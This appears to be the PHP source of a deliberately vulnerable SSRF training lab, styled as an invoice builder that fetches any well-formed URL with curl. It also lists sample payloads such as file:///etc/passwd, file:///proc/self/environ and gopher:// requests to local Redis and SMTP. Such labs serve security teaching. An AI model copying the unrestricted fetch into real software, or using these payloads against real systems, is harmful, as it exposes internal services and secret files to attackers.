<?php
session_start();
// SSRF Lab 7 - Real-World URL Validation Bypass (DocuGen)
// Bug hunters find SSRF in document generators where filter_var(FILTER_VALIDATE_URL)
// validates URL format but does not restrict the destination host.

if (!isset($_SESSION['fetched_content'])) {
    $_SESSION['fetched_content'] = [
        [
            'type' => 'Company Logo',
            'url' => 'https://cdn.example.com/logo.png',
            'status' => 'success',
            'status_text' => 'Fetched',
            'http_code' => 200,
            'timestamp' => '2024-06-01 11:15:22'
        ],
        [
            'type' => 'Terms of Service',
            'url' => 'https://legal.example.com/terms',
            'status' => 'success',
            'status_text' => 'Fetched',
            'http_code' => 200,
            'timestamp' => '2024-06-01 11:16:05'
        ]
    ];
}

$fetchResult = null;
$error = '';
$invalid = false;

if (isset($_POST['url']) && isset($_POST['fetch'])) {
    $url = $_POST['url'];

    // URL format validation only — does not restrict destination
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $start = microtime(true);
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $elapsed = round(curl_getinfo($ch, CURLINFO_TOTAL_TIME) * 1000, 1);
        $curlError = curl_error($ch);
        curl_close($ch);

        $fetchResult = [
            'type' => $_POST['content_type'] ?? 'Custom URL',
            'url' => $url,
            'status' => 'success',
            'status_text' => $response ? 'Fetched' : 'Fetch Failed',
            'http_code' => $httpCode,
            'response_time' => $elapsed,
            'body' => $response,
            'curl_error' => $curlError,
            'timestamp' => date('Y-m-d H:i:s')
        ];

        $_SESSION['fetched_content'][] = $fetchResult;
        $_SESSION['fetched_content'] = array_slice($_SESSION['fetched_content'], -8);
    } else {
        $invalid = true;
        $error = 'Invalid URL format. The URL must be well-formed (e.g., http:// or https://). Note: format validation alone does not prevent SSRF.';
    }
}

$fetched = array_reverse($_SESSION['fetched_content']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Invoice Builder - DocuGen</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        :root {
            --brand-teal: #0d9488;
            --brand-teal-hover: #0f766e;
            --sidebar-bg: #f8fafc;
        }
        body {
            background: #f1f5f9;
            min-height: 100vh;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .topbar {
            background: #fff;
            border-bottom: 1px solid #e2e8f0;
            padding: 12px 28px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .brand {
            font-weight: 800;
            font-size: 1.3rem;
            color: var(--brand-teal);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .sidebar {
            width: 220px;
            min-height: calc(100vh - 60px);
            background: var(--sidebar-bg);
            border-right: 1px solid #e2e8f0;
            padding: 16px 0;
            position: fixed;
            left: 0;
        }
        .sidebar .nav-link {
            color: #475569;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.92rem;
            border-radius: 0;
        }
        .sidebar .nav-link:hover, .sidebar .nav-link.active {
            background: #e2e8f0;
            color: #0f172a;
            font-weight: 600;
        }
        .main-content {
            margin-left: 220px;
            padding: 28px 32px;
        }
        .card {
            border: 1px solid #e2e8f0;
            border-radius: 10px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
            background: #fff;
        }
        .card-header {
            background: #fff;
            border-bottom: 1px solid #e2e8f0;
            font-weight: 600;
            padding: 16px 20px;
        }
        .btn-brand {
            background: var(--brand-teal);
            color: #fff;
            border: none;
            font-weight: 600;
        }
        .btn-brand:hover { background: var(--brand-teal-hover); color: #fff; }
        .hint-banner {
            background: #fffbeb;
            border: 1px solid #fcd34d;
            border-radius: 8px;
            padding: 12px 16px;
            font-size: 0.88rem;
            color: #92400e;
            margin-bottom: 20px;
        }
        .raw-panel {
            background: #0f172a;
            color: #e2e8f0;
            font-family: 'Fira Code', 'Courier New', monospace;
            font-size: 0.82rem;
            border-radius: 6px;
            padding: 12px;
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #334155;
        }
        .invoice-table th {
            background: #f8fafc;
            font-weight: 600;
            font-size: 0.88rem;
        }
        .invoice-table td {
            font-size: 0.88rem;
        }
        .content-row {
            padding: 12px 16px;
            border-bottom: 1px solid #f1f5f9;
            font-size: 0.88rem;
        }
        .bypass-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 12px;
            font-size: 0.82rem;
        }
        .bypass-card h6 {
            font-size: 0.8rem;
            font-weight: 700;
            color: #475569;
            margin-bottom: 6px;
        }
        .bypass-card code {
            background: #e2e8f0;
            padding: 1px 5px;
            border-radius: 3px;
            font-size: 0.78rem;
            color: #b91c1c;
        }
    </style>
</head>
<body>

<!-- Topbar -->
<div class="topbar">
    <div class="brand"><i class="bi bi-file-earmark-text"></i> DocuGen</div>
    <div class="d-flex align-items-center gap-3">
        <span class="text-muted" style="font-size:0.85rem;">Workspace: <strong>Acme Accounting</strong></span>
        <div class="rounded-circle bg-secondary" style="width:32px;height:32px;"></div>
    </div>
</div>

<!-- Sidebar -->
<div class="sidebar">
    <nav class="nav flex-column">
        <a class="nav-link" href="#"><i class="bi bi-speedometer2"></i> Dashboard</a>
        <a class="nav-link active" href="#"><i class="bi bi-file-earmark-text"></i> Invoices</a>
        <a class="nav-link" href="#"><i class="bi bi-people"></i> Clients</a>
        <a class="nav-link" href="#"><i class="bi bi-layout-text-window"></i> Templates</a>
        <a class="nav-link" href="#"><i class="bi bi-bar-chart-line"></i> Reports</a>
        <a class="nav-link" href="#"><i class="bi bi-gear"></i> Settings</a>
    </nav>
</div>

<!-- Main Content -->
<div class="main-content">
    <div class="hint-banner">
        <i class="bi bi-lightbulb"></i>
        <strong>Bug Bounty Tip:</strong> DocuGen fetches external content for your documents. URL <em>format</em> is validated, but any reachable destination is permitted — including internal services, <code>file://</code>, and cloud metadata endpoints.
    </div>

    <div class="row g-4">
        <!-- Invoice + External Content Fetcher -->
        <div class="col-lg-7">
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="bi bi-file-earmark-text"></i> Invoice #INV-2024-001</span>
                    <span class="badge bg-success-subtle text-success" style="font-size:0.78rem;">Draft</span>
                </div>
                <div class="card-body p-4">
                    <div class="row mb-3">
                        <div class="col-6">
                            <div class="text-muted" style="font-size:0.82rem;">From</div>
                            <div class="fw-bold">Acme Accounting LLC</div>
                            <div class="text-muted" style="font-size:0.82rem;">123 Finance Street<br>New York, NY 10001</div>
                        </div>
                        <div class="col-6 text-end">
                            <div class="text-muted" style="font-size:0.82rem;">To</div>
                            <div class="fw-bold">Acme Corp</div>
                            <div class="text-muted" style="font-size:0.82rem;">456 Business Ave<br>San Francisco, CA 94102</div>
                        </div>
                    </div>

                    <table class="table invoice-table">
                        <thead>
                            <tr>
                                <th>Item</th>
                                <th class="text-end">Qty</th>
                                <th class="text-end">Rate</th>
                                <th class="text-end">Amount</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>Web Design Services</td>
                                <td class="text-end">1</td>
                                <td class="text-end">$2,500.00</td>
                                <td class="text-end">$2,500.00</td>
                            </tr>
                            <tr>
                                <td>Hosting — Annual</td>
                                <td class="text-end">1</td>
                                <td class="text-end">$480.00</td>
                                <td class="text-end">$480.00</td>
                            </tr>
                            <tr>
                                <td>Consulting — 10 Hours</td>
                                <td class="text-end">10</td>
                                <td class="text-end">$150.00</td>
                                <td class="text-end">$1,500.00</td>
                            </tr>
                        </tbody>
                        <tfoot>
                            <tr>
                                <th colspan="3" class="text-end">Total</th>
                                <th class="text-end">$4,480.00</th>
                            </tr>
                        </tfoot>
                    </table>

                    <hr style="border-color:#e2e8f0;">

                    <h6 class="fw-bold mb-3" style="font-size:0.9rem;"><i class="bi bi-cloud-download"></i> Add External Content</h6>
                    <form method="post">
                        <div class="row g-2 mb-3">
                            <div class="col-md-4">
                                <select name="content_type" class="form-select" style="font-size:0.88rem;">
                                    <option value="Company Logo">Company Logo</option>
                                    <option value="Terms of Service">Terms of Service</option>
                                    <option value="Payment Page">Payment Page</option>
                                    <option value="Custom URL">Custom URL</option>
                                </select>
                            </div>
                            <div class="col-md-8">
                                <div class="input-group">
                                    <input type="text" name="url" class="form-control" placeholder="https://example.com/content" required>
                                    <button type="submit" name="fetch" value="1" class="btn btn-brand">
                                        <i class="bi bi-play-fill"></i> Fetch & Preview
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="form-text" style="font-size:0.8rem;">
                            DocuGen will fetch and preview the content before embedding it into the document.
                            <span data-bs-toggle="tooltip" title="The backend validates the URL format with filter_var(), then fetches it via curl_exec(). No host restriction is applied after validation — any reachable URL, including file://, gopher://, and internal services, will be fetched."><i class="bi bi-question-circle" style="cursor:pointer;color:var(--brand-teal);"></i></span>
                        </div>
                    </form>

                    <?php if ($invalid): ?>
                        <div class="alert alert-danger py-2 mt-3" style="font-size:0.88rem;">
                            <i class="bi bi-exclamation-triangle"></i> <?php echo $error; ?>
                        </div>
                    <?php endif; ?>

                    <?php if ($fetchResult): ?>
                    <div class="mt-4">
                        <div class="d-flex justify-content-between align-items-center mb-2">
                            <span class="fw-bold" style="font-size:0.9rem;">Content Preview</span>
                            <span class="badge <?php echo $fetchResult['status'] == 'success' && $fetchResult['body'] ? 'bg-success-subtle text-success' : 'bg-danger-subtle text-danger'; ?>">
                                <?php echo $fetchResult['status_text']; ?>
                            </span>
                        </div>
                        <div class="text-muted mb-2" style="font-size:0.82rem;">
                            <i class="bi bi-tag"></i> <?php echo htmlspecialchars($fetchResult['type']); ?> &middot;
                            <i class="bi bi-link-45deg"></i> <?php echo htmlspecialchars($fetchResult['url']); ?><br>
                            <i class="bi bi-globe"></i> HTTP <?php echo $fetchResult['http_code']; ?> &middot;
                            <i class="bi bi-clock"></i> <?php echo $fetchResult['response_time']; ?>ms &middot;
                            <?php echo $fetchResult['timestamp']; ?>
                        </div>
                        <?php if (!empty($fetchResult['curl_error'])): ?>
                            <div class="alert alert-danger py-2" style="font-size:0.85rem;">
                                <i class="bi bi-exclamation-triangle"></i> <?php echo htmlspecialchars($fetchResult['curl_error']); ?>
                            </div>
                        <?php endif; ?>
                        <?php if (!empty($fetchResult['body'])): ?>
                        <div class="raw-panel">
<?php echo htmlspecialchars(mb_strimwidth($fetchResult['body'], 0, 2000, '…')); ?>
                        </div>
                        <?php endif; ?>
                    </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <!-- Right: Fetched Content + Methodology -->
        <div class="col-lg-5">
            <div class="card">
                <div class="card-header"><i class="bi bi-clock-history"></i> Fetched Content</div>
                <div class="card-body p-0">
                    <?php foreach ($fetched as $f): ?>
                    <div class="content-row">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <div class="fw-semibold" style="font-size:0.88rem;">
                                    <i class="bi bi-link-45deg text-muted"></i> <?php echo htmlspecialchars($f['type']); ?>
                                </div>
                                <div class="text-muted" style="font-size:0.78rem;">
                                    <?php echo htmlspecialchars(parse_url($f['url'], PHP_URL_HOST) ?: $f['url']); ?> &middot; <?php echo $f['timestamp']; ?>
                                </div>
                            </div>
                            <span class="badge <?php echo $f['status'] == 'success' ? 'bg-success-subtle text-success' : 'bg-danger-subtle text-danger'; ?>" style="font-size:0.72rem;">
                                <?php echo $f['status_text']; ?>
                            </span>
                        </div>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>

            <div class="card mt-4" style="border-left:4px solid var(--brand-teal);">
                <div class="card-body">
                    <h6 class="fw-bold mb-2" style="color:var(--brand-teal);"><i class="bi bi-bug"></i> Where Bug Hunters Find This</h6>
                    <ul class="mb-3" style="font-size:0.85rem; padding-left:1.2rem;">
                        <li>Invoice / receipt generators (FreshBooks, QuickBooks, Stripe)</li>
                        <li>Website-to-PDF converters (wkhtmltopdf, WeasyPrint as a service)</li>
                        <li>Report builders with embedded content (Tableau, Power BI)</li>
                        <li>Document signing platforms fetching terms of service</li>
                        <li>Marketing automation fetching landing pages</li>
                        <li>Chatbot / AI tools fetching web content</li>
                    </ul>
                    <hr style="border-color:#e2e8f0;margin:12px 0;">
                    <h6 class="fw-bold mb-2" style="color:#475569;font-size:0.82rem;"><i class="bi bi-lightning-charge"></i> Protocol Bypass Techniques</h6>
                    <div class="bypass-card mb-2">
                        <h6>file:// Protocol</h6>
                        <code>file:///etc/passwd</code><br>
                        <code>file:///proc/self/environ</code>
                    </div>
                    <div class="bypass-card mb-2">
                        <h6>gopher:// Protocol</h6>
                        <code>gopher://127.0.0.1:6379/_INFO</code> (Redis)<br>
                        <code>gopher://127.0.0.1:25/_HELO</code> (SMTP)
                    </div>
                    <div class="bypass-card mb-2">
                        <h6>dict:// Protocol</h6>
                        <code>dict://127.0.0.1:3306/info</code> (MySQL fingerprint)
                    </div>
                    <div class="bypass-card mb-2">
                        <h6>ldap:// Protocol</h6>
                        <code>ldap://127.0.0.1:389/dc=internal</code> (directory enum)
                    </div>
                    <div class="bypass-card">
                        <h6>ftp:// Protocol</h6>
                        <code>ftp://anonymous@127.0.0.1:21/</code> (internal FTP)
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]');
    const tooltipList = [...tooltipTriggerList].map(t => new bootstrap.Tooltip(t));
</script>
</body>
</html>
